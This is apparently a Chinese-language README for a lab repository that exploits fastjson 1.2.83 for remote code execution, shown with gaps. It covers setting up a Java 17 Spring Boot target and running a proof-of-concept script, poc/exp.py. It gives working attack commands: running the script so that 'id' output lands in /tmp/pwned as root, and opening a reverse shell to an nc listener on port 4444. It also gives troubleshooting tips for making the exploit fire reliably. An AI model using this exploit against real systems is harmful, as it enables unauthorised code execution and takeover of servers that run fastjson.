...
> 本仓库 `pom.xml` 已把 `java.version` 固定为 17，构建与运行环境对齐，避免误用 Java 8 启动靶场导致 FD 链静默失败。

## 二、文件结构

```
fastjson-1.2.83-rce/
├── pom.xml                         # Spring Boot 2.7 靶场 (Java 17, 已固定)
...
```bash
# 确认用的是 OpenJDK 17
java -version        # 必须显示 17.x; 若不是, 先切 JAVA_HOME 到 17 再 build
mvn clean package
...
>
> 注意：你用来**跑靶场**和**跑 GenProbe** 的 `java` 都要是 17。Kali 上若默认是别的版本，先 `export JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64 && export PATH=$JAVA_HOME/bin:$PATH`。
...
>
> 启动后务必确认 `curl -s http://127.0.0.1:18080/info` 能返回 JSON（含 `autoTypeSupport:false`、`safeMode:false`）。返回空或拒绝连接 = 靶场没起来，先排这个再打。
...
**① 验证是否触发（写文件法，最直观，结果落在靶机本地）：**

> ⚠️ **重点**：`<clinit>` 里的命令由**靶机** `/bin/bash -c` 执行，输出默认进靶机 JVM 的 stdout（即 `/tmp/target.log`），**不会回到你的攻击机终端**，HTTP 响应也只回 `{"ok":true}`。所以 `--cmd "id"` 看不到任何回显是**正常的**，不代表没触发。
> 最稳妥的验证：让命令把结果写到靶机本地文件，然后去靶机上 `cat`。

```bash
# 攻击机: 让靶机把 id 结果写到 /tmp/pwned
python3 poc/exp.py 127.0.0.1 19090 http://127.0.0.1:18080 \
    --mode fd --cmd "id > /tmp/pwned 2>&1" --timeout 60

# 靶机(同一台机器也行): 看结果
cat /tmp/pwned        # 能看到 uid=0(root) ... 即 RCE 已触发
# 或者: ls -la /tmp/pwned 看到文件生成, 也说明 <clinit> 已执行
```

**② 交互式反弹 shell（先开监听，再打，这是最"看得见"的验证）：**
...
1. **每次测试必须重启靶场（或换 `--tag`）**：fastjson 会把加载过的类缓存，同名类 `<clinit>` 不再重跑 → 发了但没反应。换 `--tag sh1` / `sh2` 等于换一批类名，能绕过缓存。
2. **`--max-fd 2048` 必填（脚本默认已改 2048）**： `GenProbe` 生成 `fd 3~2048` 的类， `exp.py` 默认也已改成 2048 并传给 GenProbe，二者必须一致。靶场稳态已开 ~407 个 fd， `probe.jar` 落在 400+，枚举不到就必然漏掉。
3. **4444 上只能有 1 个 nc 监听**：多次尝试残留的 nc 会让内核把反弹连接分给别的，你盯着的那个没收到 → "没反应"。开打之前先 `fuser -k 4444/tcp` 清一遍。
4. **监听必须先于利用打开**：反弹 shell 是靶机主动连回，监听没起就发了 → 连不上。
5. **靶场 JVM 必须 OpenJDK 17**：Zulu / JDK 8 在 `aarch64` 上经 `/proc/self/fd` 软链解析 jar 返回 `NULL`，FD 链静默失败（纯 JDK 实现差异，与 fastjson 版本无关）。本仓库 `pom.xml` 已固定 `java.version=17`，但**运行靶场的 `java` 命令本身也得是 17**。
6. **`--cmd "id"` 不会回显**：见第四节 ① 说明。验证请用写文件法或反弹 shell，不要盯着终端等"回显"。
